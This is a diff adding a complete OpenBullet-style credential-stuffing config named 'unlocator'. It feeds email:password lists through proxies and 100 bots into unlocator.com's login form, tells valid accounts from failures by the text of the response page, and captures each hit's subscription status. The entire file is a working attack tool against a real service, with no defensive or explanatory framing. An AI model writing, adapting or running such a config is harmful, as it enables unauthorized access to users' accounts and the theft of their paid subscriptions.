@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "unlocator",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-03T02:40:24.0618793+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login_(POST) REQUEST POST "https://unlocator.com/account/login" AutoRedirect=TRUE 
+  CONTENT "amember_login=<USER>&amember_pass=<PASS>&login_attempt_id=1527992228" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://unlocator.com/account/login/index" 
+  HEADER "origin: https://unlocator.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The user name or password is incorrect " 
+  KEYCHAIN Success OR 
+    KEY "New Terms of use and Privacy Policy" 
+    KEY "My Account" 
+PARSE "<SOURCE>" LR "b>Subscription Status</b></td>" "<td style=\"vertical-align: middle;\"><span class=\"status_check\">&#" Recursive=FALSE -> VAR "Subscription" "" "" 
+PARSE "<Subscription>" LR "" "" Recursive=FALSE -> CAP "SubscriptionStatus" "" "" 
